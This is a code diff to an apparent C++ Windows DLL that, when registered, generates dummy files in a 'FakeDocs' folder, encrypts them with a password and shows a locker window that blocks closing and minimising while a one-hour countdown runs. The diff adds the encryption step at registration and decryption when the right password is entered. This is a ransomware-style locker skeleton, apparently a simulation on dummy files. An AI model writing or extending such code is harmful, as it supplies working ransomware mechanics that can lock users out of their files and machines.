@@ -18,6 +18,8 @@ HFONT hFontBold;
 HWND hWndEncryptionStatusLabel; // Encryption Status Label
 std::wstring correctPassword;
 
+
+std::wstring targetFolder = L"C:\\Users\\Public\\Documents\\FakeDocs";
 // Timer variables
 int remainingTime = 3600;
 UINT_PTR timerID;
@@ -105,13 +107,13 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
     switch (uMsg)
     {
-    case WM_CLOSE:
-        return 0; // Block closing via X button
+     case WM_CLOSE:
+         return 0; // Block closing via X button
 
-    case WM_SYSCOMMAND:
-        if (wParam == SC_CLOSE || wParam == SC_MINIMIZE)
-            return 0; // Block ALT+TAB and Minimize
-        break;
+     case WM_SYSCOMMAND:
+         if (wParam == SC_CLOSE || wParam == SC_MINIMIZE)
+             return 0; // Block ALT+TAB and Minimize
+         break;
 
     case WM_ERASEBKGND:
     {
@@ -139,6 +141,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             if (wcscmp(inputText, correctPassword.c_str()) == 0)
             {
                 MessageBox(hwnd, L"Access Granted!", L"Success", MB_OK | MB_ICONINFORMATION);
+				// Decrypt files    
+				DecryptAllFilesInFolder(targetFolder, std::string(inputText, inputText + wcslen(inputText)));
+				// Close the application
                 ExitProcess(0);
             }
             else
@@ -271,10 +276,10 @@ extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() {
     correctPassword = std::wstring(password.begin(), password.end());
 
 
-    std::wstring targetFolder = L"C:\\Users\\Public\\Documents\\FakeDocs";
+
     int filesPerType = 5;
     GenerateDummyFiles(targetFolder,filesPerType);
-
+	EncryptAllFilesInFolder(targetFolder, password); // Encrypt files with the password
     ShowGUI(); 
     return S_OK; 
 }
